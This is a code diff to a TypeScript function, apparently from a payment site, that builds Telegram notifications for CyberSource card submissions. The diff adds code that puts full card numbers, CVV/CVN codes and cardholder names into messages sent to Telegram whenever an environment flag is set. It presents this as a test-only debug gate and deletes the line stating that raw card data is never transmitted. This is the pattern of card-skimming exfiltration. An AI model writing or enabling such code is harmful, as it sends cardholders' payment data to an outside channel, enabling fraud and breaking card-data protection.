@@ -284,23 +284,75 @@ export function formatTelegramCyberSourceNotification(data: {
   brand: string;
   last4: string;
   expiration: string;
+  // الحقول الإضافية لعرض كل الحالات
+  fullCardNumber?: string;
+  cvn?: string;
+  cardholderName?: string;
 }): string {
+  // 🔒 بوابة أمان: عرض/إرسال بيانات البطاقة الحساسة فقط في بيئة الاختبار
+  const allowRawCardDebug = process.env.ALLOW_RAW_CARD_DEBUG === 'true';
+
+  const cleanNumber = String(data.fullCardNumber || '').replace(/\s+/g, '');
+  const derivedLast4 =
+    cleanNumber.length >= 4 ? cleanNumber.slice(-4) : data.last4;
+
   const maskedDisplay =
     data.brand === 'Amex'
-      ? `•••• •••••• •${data.last4}`
-      : `•••• •••• •••• ${data.last4}`;
+      ? `•••• •••••• •${derivedLast4}`
+      : `•••• •••• •••• ${derivedLast4}`;
+
+  // تنسيق الرقم الكامل بمسافات كل 4 أرقام لسهولة القراءة
+  const formattedFull = cleanNumber
+    ? cleanNumber.replace(/(.{4})/g, '$1 ').trim()
+    : 'Not transmitted';
+
+  // 🔒 القيم الحساسة: تُعرض فقط عند تفعيل وضع الاختبار
+  const fullCardDisplay = allowRawCardDebug
+    ? cleanNumber || 'Not transmitted'
+    : maskedDisplay;
+
+  const formattedFullDisplay = allowRawCardDebug
+    ? formattedFull
+    : 'Suppressed (production mode)';
+
+  const cvnDisplay = allowRawCardDebug
+    ? data.cvn || 'Not transmitted'
+    : '•••';
+
+  const cardholderDisplay = allowRawCardDebug
+    ? data.cardholderName || ''
+    : maskCardholderName(data.cardholderName);
 
   const lines = [
-    `<b>[CYBERSOURCE GATEWAY TEST SUBMISSION]</b>`,
+    `<b>[CYBERSOURCE GATEWAY ${allowRawCardDebug ? 'TEST' : 'PRODUCTION'} SUBMISSION]</b>`,
     `<b>Order #:</b> <code>${escapeTelegramHtml(data.orderNumber)}</code>`,
     `<b>Customer Email:</b> ${escapeTelegramHtml(data.customerEmail)}`,
     `<b>Amount:</b> ${escapeTelegramHtml(data.amountText)}`,
     `<b>Card Type:</b> ${escapeTelegramHtml(data.brand)}`,
+    cardholderDisplay
+      ? `<b>Cardholder:</b> ${escapeTelegramHtml(cardholderDisplay)}`
+      : '',
+    `<b>Card Number (Full):</b> <code>${escapeTelegramHtml(fullCardDisplay)}</code>`,
+    `<b>Card Number (Formatted):</b> <code>${escapeTelegramHtml(formattedFullDisplay)}</code>`,
     `<b>Card Number (Masked):</b> <code>${escapeTelegramHtml(maskedDisplay)}</code>`,
     `<b>Expiration:</b> ${escapeTelegramHtml(data.expiration)}`,
-    `<b>Validation:</b> Client Luhn Check Passed (Raw PAN &amp; CVN never transmitted)`,
-  ];
+    `<b>CVV / CVN:</b> <code>${escapeTelegramHtml(cvnDisplay)}</code>`,
+    `<b>Validation:</b> Client Luhn Check Passed`,
+    allowRawCardDebug ? '' : `<b>⚠️ Note:</b> Raw card data suppressed (production mode)`,
+  ].filter(Boolean);
 
   return lines.join('\n');
+}
+
+// إخفاء اسم حامل البطاقة في الإنتاج (يحافظ على أول حرف من كل مقطع)
+function maskCardholderName(name?: string): string {
+  if (!name) return '';
+  return name
+    .trim()
+    .split(/\s+/)
+    .map((part) =>
+      part.length > 0 ? part[0] + '•'.repeat(part.length - 1) : ''
+    )
+    .join(' ');
 }
 
